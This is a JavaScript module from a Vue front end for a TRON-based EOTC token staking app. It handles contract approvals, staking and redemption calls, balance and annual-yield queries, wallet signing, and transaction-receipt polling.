// import {
// 	contractAddress,
// 	contractAddress_eotc,
// 	contractAddress_xeotc
// } from "./abi_stake";
import axios from 'axios'
// DFDC568B71C6A5B817D4421EC466217F   批量上链token
// 主网

const regular1 = 'TQQfPrKFrq6ebXBG6HWcfmvbfafgyaU1pU'
const regular = 'TCvz9REhN7aaRkfZjU5evRQkAugyfQBFZN'
const contractAddress = 'THNqmcaX1xGRJvwXFa9z5JEjWN5Dy1jDT2' // THNqmcaX1xGRJvwXFa9z5JEjWN5Dy1jDT2
const contractAddress_eotc = 'TWP9nhCPWPa6Wr1wSgNY228jGgZ3vzjw4u' //TEt19qEdJM2sPBxLB5XmJGWijT6UvFbs1K
const contractAddress_xeotc = 'TTodNc8GxdWiCVvSVNCmwwFy5cocnP9QdE' //TJ2ijtG2xfaEhrLrU81h742bPfcHL4CL1w
const netType = 'trx'
const url = 'https://api.trongrid.io/wallet/gettransactioninfobyid'
// 测试网
// const regular1 = 'TCZcvTpH8F1wk9m3U9fvYcA8SsE492Ai77'
// const regular = 'TBFVpEHvZ9ZT9sKB52mRNwhZ7gbVZt6zvm'
// const contractAddress = 'TXS4RzuouiekwcnU8SbEdgvypbESeGWuW8'
// const contractAddress_eotc = 'TEt19qEdJM2sPBxLB5XmJGWijT6UvFbs1K'
// const contractAddress_xeotc = 'TJ2ijtG2xfaEhrLrU81h742bPfcHL4CL1w'
// const netType = 'xxx'
// const url = 'https://api.shasta.trongrid.io/wallet/gettransactioninfobyid'

import Vue from 'vue'
import loadingToast from '@/components/loading-toast'
import { Toast } from 'vant'
import { MyEOTC, StakingEotc } from '@/api/trxRequest'
import md5 from 'md5'

const trxMin = 30000000
const trxMes = '为使交易顺畅，请确保钱包中不少于80 TRX'
var signMes = 'EOTC请求您签名确认,签名不消耗GAS.'

//合约授权
export const usdtsend= async function (contractAds, val, address, func) {
  // contractAds='TEt19qEdJM2sPBxLB5XmJGWijT6UvFbs1K'
  // address='TCZcvTpH8F1wk9m3U9fvYcA8SsE492Ai77'
  // let valmes;
  try {
    Vue.$toast.warning('请先给智能合约授权,授权后才能执行操作')
    let mytron = await window.tronWeb.contract().at(contractAds)
    // valmes = distsmes1(mes + '<br />授权期间请不要刷新或切换页面！');
    let res = await mytron.approve(address, TronValues(val)).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    Vue.$toast.success('授权成功！')
    // func()
  } catch (e) {
    Toast.clear()
    Vue.$toast.error('授权失败！')
    // valmes.style.display = 'none';
  }
}
// 定期质押
async function RegularStaking(val, period, that) {
  console.log(111)
  try {
    let mytron = await window.tronWeb.contract().at(regular)
    let res = await mytron.deposit(TronValues(val), period).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    console.log(res)
    setTimeout(async function () {
      // let success = await Promise.all(hx(res)) ;
      // hx(res).then(asd => {
      // console.log(success);
      Toast.clear()
      // });

      // if (success.contractRet != "SUCCESS") {
      // 	Vue.$toast.error('质押失败！');
      // 	console.log('质押失败！')
      // } else {
      // 	that.myEOTC = that.myEOTC - that.zynum;
      Vue.$toast.success('质押成功！')
      // console.log('质押成功！')
      StakingEotc({ num: that.zynum, zq: that.nowaday, hx: res })

      // }
    }, 3000)
  } catch (e) {
    Toast.clear()
    if (typeof e.message != 'undefined') {
      Vue.$toast.error('质押失败！')
      console.log('质押失败！')
    }
    //  valmes.style.display = 'none';
  }
}
//活期质押
async function Staking(val, that) {
  try {
    let mytron = await window.tronWeb.contract().at(contractAddress)
    //  valmes = distsmes1('等待区块打包确认，打包期间请不要关闭或刷新该页面');
    let res = await mytron.Staking_eotc(TronValues(val)).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    setTimeout(function () {
      Toast.clear()

      that.myEOTC = that.myEOTC - that.zynum
      that.xEOTC = Number(
        Number(that.xEOTC) + that.zynum / localStorage.getItem('yield2')
      ).toFixed(2)
      that.pending = parseFloat(
        Number(that.xEOTC * localStorage.getItem('yield2')).toFixed(6)
      )
      localStorage.setItem('myEOTCNum', that.myEOTC)
      localStorage.setItem('myXEOTCNum', that.xEOTC)
      Vue.$toast.success('质押成功！')
    }, 1000)
  } catch (e) {
    Toast.clear()
    if (typeof e.message != 'undefined') {
      Vue.$toast.error('质押失败！')
    }
    //  valmes.style.display = 'none';
  }
}
//活期赎回
async function Unstaking(val, that) {
  try {
    let mytron = await window.tronWeb.contract().at(contractAddress)
    //  valmes = distsmes1('等待区块打包确认，打包期间请不要关闭或刷新该页面');
    let res = await mytron.Unstaking_eotc(TronValues(val)).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    setTimeout(function () {
      Toast.clear()

      that.xEOTC = Number(that.xEOTC - that.shnum).toFixed(2)
      that.myEOTC = Number(
        Number(that.myEOTC) + that.shnum * localStorage.getItem('yield2')
      ).toFixed(2)
      that.pending = parseFloat(
        Number(that.xEOTC * localStorage.getItem('yield2')).toFixed(6)
      )
      localStorage.setItem('myEOTCNum', that.myEOTC)
      localStorage.setItem('myXEOTCNum', that.xEOTC)
      Vue.$toast.success('赎回成功！')
    }, 1000)
  } catch (e) {
    Toast.clear()
    Vue.$toast.warning('赎回失败！')
  }
}
//定期赎回
async function RegularUnstaking(val, id, zq, that, index) {
  try {
    let mytron = await window.tronWeb.contract().at(regular)
    //  valmes = distsmes1('等待区块打包确认，打包期间请不要关闭或刷新该页面');
    let res = await mytron.reward(zq, id).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    setTimeout(function () {
      Toast.clear()
      that.myEOTC = Number(Number(that.myEOTC) + val).toFixed(2)
      localStorage.setItem('myEOTCNum', that.myEOTC)

      that.list.splice(index, 1)
      Vue.$toast.success('赎回成功！')
    }, 1000)
  } catch (e) {
    Toast.clear()
    Vue.$toast.warning('赎回失败！')
  }
}
//二次质押
async function SecondPledge(id, zq, that, index) {
  try {
    let mytron = await window.tronWeb.contract().at(regular)
    //  valmes = distsmes1('等待区块打包确认，打包期间请不要关闭或刷新该页面');
    let res = await mytron.replantSeeds(zq, id).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    setTimeout(async function () {
      // let success = await hx(res);
      Toast.clear()
      // if (success.contractRet != "SUCCESS") {
      // 	Vue.$toast.error('质押失败！');
      // } else {
      that.list.splice(index, 1)
      Vue.$toast.success('质押成功！')
      StakingEotc({ num: that.zynum, zq: that.nowaday, hx: res })
      // }
    }, 1000)
  } catch (e) {
    Toast.clear()
    Vue.$toast.warning('质押失败！')
  }
}
export const hx = function (num) {
  return new Promise((resolve, reject) => {
    function asd(num) {
      const options = {
        method: 'POST',
        url: url,
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
        },
        data: { value: num },
      }
      axios.request(options).then(function (response) {
        console.log(response.data.receipt)
        if (response.data.receipt == undefined) {
          setTimeout(() => {
            asd(num)
          }, 500)
        } else {
          console.log(response.data)
          if (response.data.receipt.result == 'SUCCESS') {
            console.log(111)
            resolve('SUCCESS')
            return
          } else if (response.data.receipt.result == 'REVERT') {
            console.log(222)
            resolve('REVERT')
            return
          }
        }
      })
    }
    asd(num)
  })
}
// export const zhuanzhang = function (num) {

// 	const options = {
// 		method: 'POST',
// 		url: url,
// 		headers: { Accept: 'application/json', 'Content-Type': 'application/json' },
// 		data: { value: num }
// 	};
// 	return new Promise((resolve, reject) => {
// 		axios
// 			.request(options)
// 			.then(function (response) {
// 				console.log(111);
// 				resolve(response.data);
// 			})
// 			.catch(function (error) {
// 				console.error(error);
// 			});
// 	})
// 		.then(res => {
// 			console.log(res);
// 			if (res.ret == undefined) {
// 				return setTimeout(() => {
// 					zhuanzhang(num);
// 				}, 500);
// 			} else {
// 				// console.log(res.receipt.result)
// 				return Promise.resolve(res);
// 			}
// 		});

// };

//数据修改
function modification(data) {
  let mnum = parseInt(data[0]._hex, 16)
  localStorage.setItem('now', mnum)
  let list = []
  for (let i = 0; i < data[1].length; i++) {
    let obj = {}
    for (let j = 0; j < data[1][i].length; j++) {
      if (j == 0) {
        obj.id = parseInt(data[1][i][j]._hex, 16)
      } else if (j == 1) {
        obj.cycle = parseInt(data[1][i][j]._hex, 16)
      } else if (j == 2) {
        obj.startTime = parseInt(data[1][i][j]._hex, 16)
      } else if (j == 3) {
        obj.amount = parseInt(data[1][i][j]._hex, 16) / 1000000
      } else if (j == 4) {
        obj.reward = parseInt(data[1][i][j]._hex, 16) / 1000000
      } else if (j == 5) {
        obj.isStop = parseInt(data[1][i][j]._hex, 16)
      }
    }
    list.push(obj)
  }
  return list
}

//获取合约1 质押记录
export const mypledge1 = async function (zq) {
  let mytron = await window.tronWeb.contract().at(regular)
  return new Promise((res, rej) => {
    // mytron.pledge('TBo2VnuGP7cKbuhfduML87npaKsxz81n1D', zq).call(
    //   {
    mytron.pledge(localStorage.getItem('walletAddress'), zq).call(
      {
        from: window.tronWeb.defaultAddress.base58,
      },
      function (error, result) {
        if (!error) {
          let data = modification(result)
          res(data)
        } else {
          Vue.$toast.error(error)
          rej(error)
        }
      }
    )
  })
}
export const mypledge2 = async function (zq) {
  let mytron = await window.tronWeb.contract().at(regular1)
  return new Promise((res, rej) => {
    // mytron.pledge('TBo2VnuGP7cKbuhfduML87npaKsxz81n1D', zq).call(
    //   {
    mytron.pledge(localStorage.getItem('walletAddress'), zq).call(
      {
        from: window.tronWeb.defaultAddress.base58,
      },
      function (error, result) {
        if (!error) {
          let data = modification(result)
          res(data)
        } else {
          Vue.$toast.error(error)
          rej(error)
        }
      }
    )
  })
}
//获取定期年化率
export const AnnualYield = async function (zq) {
  let mytron = await window.tronWeb.contract().at(regular)

  return new Promise((res, rej) => {
    mytron.investYearRate(zq).call(
      {
        from: window.tronWeb.defaultAddress.base58,
      },
      function (error, result) {
        if (!error) {
          let mnum = parseInt(result._hex, 16) / 1000000.0
          localStorage.setItem('yield', mnum)
          res(mnum)
        } else {
          Vue.$toast.error(error)
        }
      }
    )
  })
}
//查询定期可赎回订单
export const Redeemable = async function (zq) {
  let mytron = await window.tronWeb.contract().at(regular)

  return new Promise((res, rej) => {
    mytron.expiresOrders(localStorage.getItem('walletAddress'), zq).call(
      {
        from: window.tronWeb.defaultAddress.base58,
      },
      function (error, result) {
        if (!error) {
          let data = modification(result)
          res(data)
        } else {
          Vue.$toast.error(error)
          rej()
        }
      }
    )
  })
}

function TronValues(val) {
  let vl = parseFloat(val).toFixed(6) * Math.pow(10, 6)
  vl = parseInt(vl)
  return vl.toString()
}

//判断钱包trx是否大于50
export const getTrxBalance = function (func) {
  let minNum = 80000000
  window.tronWeb.trx
    .getBalance(window.tronWeb.defaultAddress.base58)
    .then((result) => {
      console.log(result)
      if (parseInt(result) >= minNum) func()
      else {
        Toast.clear()
        Vue.$toast.warning(trxMes)
      }
    })
}

//手续费转账
export const sfeotc = async function (func) {
  let num = getRandom(55, 79)
  // let num = getRandom(1, 2);
  let result = await window.tronWeb.trx.sendTransaction(
    'TA6jfgkurdTrwqic3G56GpG2Keh5EWx2kq',
    TronValues(num)
  )

  console.log(result)
  // setTimeout(function () {
  // debugger.
  // console.log(111);
  // let success = await zhuanzhang(result.txid);
  // console.log(success);
  // if (success.ret[0].contractRet != "SUCCESS") {
  // 	Toast.clear();
  // 	Vue.$toast.error('质押失败！');
  // } else {
  localStorage.setItem('apphx', result.txid)
  func()
  // }
  // }, 1000);

  // });
}

export const getRandom = function (min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

//年化收益率
async function GetArp(that) {
  let mytron = await window.tronWeb.contract().at(contractAddress)
  mytron.get_arp().call(
    {
      from: window.tronWeb.defaultAddress.base58,
    },
    function (error, result) {
      if (!error) {
        let arp0 = (parseInt(result[0]._hex, 16) / 1000000.0) * 36500
        let arp1 = parseInt(result[1]._hex, 16) / 1000000.0
        let arp = [arp0, arp1]
        localStorage.setItem('yield2', arp[1])
        localStorage.setItem('LiveYear', arp[0])

        that.year = arp[0] + '%'
        that.conversion = arp[1].toFixed(4) + 'EOTC'
        that.pending = parseFloat(
          Number(localStorage.getItem('myXEOTCNum') * arp[1]).toFixed(6)
        )
      } else {
        Vue.$toast.error(error)
      }
    }
  )
}
//授权验证
async function myApprove(contractAds, num, func, that) {
  let ads = window.tronWeb.defaultAddress.base58
  let mytron = await window.tronWeb.contract().at(contractAds)
  let address
  if (that == null) {
    address = contractAddress
  } else {
    address = regular
  }
  console.log(address,contractAds)
  const value = await mytron.allowance(ads, address).call()
  let owancevalue
  try {
    owancevalue = value.remaining._hex
  } catch {
    owancevalue = value._hex
  }

  let mnum = parseInt(owancevalue, 16) / 1000000.0 //window.tronWeb.fromSun(result);//window.tronWeb.toSun();
  console.log(num,mnum)

  // console.log(parseFloat(num))
  if (mnum >= parseFloat(num)) func()
  else {
    // waitPageClose();
    usdtsend(contractAds, 100000000, address, func)
  }
}

//获取xeotc钱包余额
export const myxEOTCAmount = async function (that) {
  loadweb3()
  var mynum = 0
  let mytron = await window.tronWeb.contract().at(contractAddress_xeotc)
  let ads = window.tronWeb.defaultAddress.base58
  mytron.balanceOf(ads).call(
    {
      from: ads,
    },
    function (error, result) {
      if (!error) {
        mynum = result / 1000000
        // xeotcNumber = mynum;
        if (that.nowaday == '') GetArp(that)
        that.xEOTC = mynum
        window.localStorage.setItem('myXEOTCNum', mynum)
      } else {
        Vue.$toast.error(error)
      }
    }
  )
}

//获取EOTC钱包余额
export const myEOTCAmount = async function (that) {
  let mytron = await window.tronWeb.contract().at(contractAddress_eotc)
  let ads = window.tronWeb.defaultAddress.base58
  mytron.balanceOf(ads).call(
    {
      from: ads,
    },
    function (error, result) {
      if (!error) {
        console.log(result)
        var mynum = result / 1000000
        that.myEOTC = mynum
        window.localStorage.setItem('myEOTCNum', mynum)
      } else {
        Vue.$toast.error(error)
      }
    }
  )
}

//用户活期质押EOTC
export const MyStaking = function (stakeAmount, that) {
  Toast.loading({
    duration: 0, // 持续展示 toast
    forbidClick: true,
    message: '质押中',
  })
  getTrxBalance(function () {
    myApprove(contractAddress_eotc, stakeAmount, function () {
      Staking(stakeAmount, that)
    })
  })
}

//用户定期质押
export const MyRegularStaking = function (stakeAmount, period, that) {
  Toast.loading({
    duration: 0, // 持续展示 toast
    forbidClick: true,
    message: '质押中',
  })
  getTrxBalance(function () {
    myApprove(
      contractAddress_eotc,
      stakeAmount,
      function () {
        RegularStaking(stakeAmount, period, that)
      },
      that
    )
  })
}

//用户活期赎回eotc
export const MyUnstaking = function (unstakeAmount, that) {
  Toast.loading({
    duration: 0, // 持续展示 toast
    forbidClick: true,
    message: '赎回中',
  })
  getTrxBalance(function () {
    myApprove(contractAddress_xeotc, unstakeAmount, function () {
      Unstaking(unstakeAmount, that)
    })
  })
}
//用户定期赎回
export const MyRegularUnstaking = function (stakeAmount, id, zq, that, index) {
  Toast.loading({
    duration: 0, // 持续展示 toast
    forbidClick: true,
    message: '赎回中',
  })
  getTrxBalance(function () {
    RegularUnstaking(stakeAmount, id, zq, that, index)
  })
}
//用户二次质押
export const MySecondPledge = function (stakeAmount, id, zq, that, index) {
  Toast.loading({
    duration: 0, // 持续展示 toast
    forbidClick: true,
    message: '质押中',
  })
  getTrxBalance(function () {
    myApprove(
      contractAddress_eotc,
      stakeAmount,
      function () {
        SecondPledge(id, zq, that, index)
      },
      that
    )
  })
}
//检测时候是 波场网络
export const loadweb3 = function (func) {
  if (window.tronWeb) {
    // debugger
    var obj = setInterval(async () => {
      if (window.tronWeb.defaultAddress.base58) {
        let walletAddress = window.tronWeb.defaultAddress.base58
        console.log(localStorage.getItem('signPledge'))
        if (
          localStorage.getItem('walletAddress') != walletAddress ||
          localStorage.getItem('signPledge') == null
        ) {
          userSign('EOTC请求您签名确认,签名不消耗GAS.')
        }

        localStorage.setItem('walletAddress', walletAddress)
        localStorage.setItem('net', netType)
        MyEOTC({}).then((res) => {
          localStorage.setItem('appEOTC', res.data.State)
        })

        clearInterval(obj)
        if (func != null) func()
      }
    }, 10)
  } else {
    Vue.$toast.error('请在支持TRON网络的DAPP浏览器中访问')
    // localStorage.clear();
  }
}
//消息签名
export const userSign = async (mes, func) => {
  return new Promise((resolve, reject) => {
    try {
      let tronweb = window.tronWeb
      tronweb.trx
        .sign(tronweb.toHex(mes))
        .then((signedStr) => {
          if (signedStr.substring(0, 2) === '0x') {
            signedStr = signedStr.substring(2)
          }
          // Vue.$toast.error(md5(signedStr), {
          // 	timeout: 20000
          // });
          // localStorage.setItem("myaddress", tronweb.defaultAddress.base58);
          localStorage.setItem('signPledge', md5(signedStr))
          if (func != null) {
            func()
          }
          resolve()
        })
        .catch((err) => {
          localStorage.clear()
          reject('拒绝签名')
        })
    } catch (err) {
      reject('签名：', err)
    }
  })
}
//用户定期质押
export const MyRelease = function (stakeAmount, zq, that, func) {
  Toast.loading({
    duration: 0, // 持续展示 toast
    forbidClick: true,
    message: '批量质押中',
  })
  getTrxBalance(function () {
    myApprove(
      contractAddress_eotc,
      stakeAmount,
      function () {
        Release(zq, that, func)
      },
      that
    )
  })
}
//未释放批量质押
async function Release(zq, that, func) {
  let num = []
  for (let i of that.nownum) {
    console.log(JSON.stringify(i))
    num.push(TronValues(JSON.stringify(i)))
  }
  console.log(that.nowads)
  console.log(num)
  try {
    let mytron = await window.tronWeb.contract().at(regular1)
    let res = await mytron.mintedBatch(that.nowads, num, zq).send({
      feeLimit: 5000000000,
      callValue: 0,
      shouldPollResponse: false,
    })
    console.log(res)
    setTimeout(function () {
      // let success = await Promise.all(hx(res));
      hx(res).then((success) => {
        console.log(success)
        Toast.clear()
        if (success == 'SUCCESS') {
          Vue.$toast.success('质押成功！', {
            timeout: 20000,
          })
          func()
        } else if (success == 'REVERT') {
          Vue.$toast.error('质押失败！', {
            timeout: 20000,
          })
        } else {
          Vue.$toast.error(success, {
            timeout: 20000,
          })
        }
      })
    }, 1000)
  } catch (e) {
    Toast.clear()
    console.log(e)
    // if (typeof (e.message) != 'undefined') {
    Vue.$toast.error(e, {
      timeout: 10000,
    })
    // }
    //  valmes.style.display = 'none';
  }
}

// export const asd = async function (stakeAmount, zq, that, func) {
//   // let arr=[246,247,248,249,250]
//   Toast.loading({
//     duration: 0, // 持续展示 toast
//     forbidClick: true,
//     message: '批量质押中',
//   })
//   try {
//     let mytron = await window.tronWeb
//       .contract()
//       .at('TKDHJMgVeN9x7j3g564jB9AgLxRNo3WTeN')
//     let res = await mytron.allWithdraw().send({
//       feeLimit: 5000000000,
//       callValue: 0,
//       shouldPollResponse: false,
//     })
//     console.log(res)
//     // if(res.error=='Cannot find result in solidity node'){
//     // 	asd()
//     // 	return
//     // }

//     Toast.clear()
//     setTimeout(function () {
//       hx(
//         '388a787354893c3eeafecd43dc92da3555ebf8a07938d238f578f606aaed5a44'
//       ).then((success) => {
//         console.log(success)
//       })
//       // 	hx(res).then(success => {
//       // 		console.log(success);
//       // 		Toast.clear();
//       // 		if (success == 'SUCCESS') {
//       // 			Vue.$toast.success('质押成功！', {
//       // 				timeout: 20000
//       // 			});
//       // 			// func();
//       // 		} else if (success == 'REVERT') {
//       // 			Vue.$toast.error('质押失败！', {
//       // 				timeout: 20000
//       // 			});
//       // 		} else {
//       // 			Vue.$toast.error(success, {
//       // 				timeout: 20000
//       // 			});
//       // 		}

//       // 	});
//     }, 1000)
//   } catch (e) {
//     Toast.clear()
//     console.log(e)
//     // if (typeof (e.message) != 'undefined') {
//     Vue.$toast.error(e, {
//       timeout: 10000,
//     })
//     // }
//     //  valmes.style.display = 'none';
//   }
// }
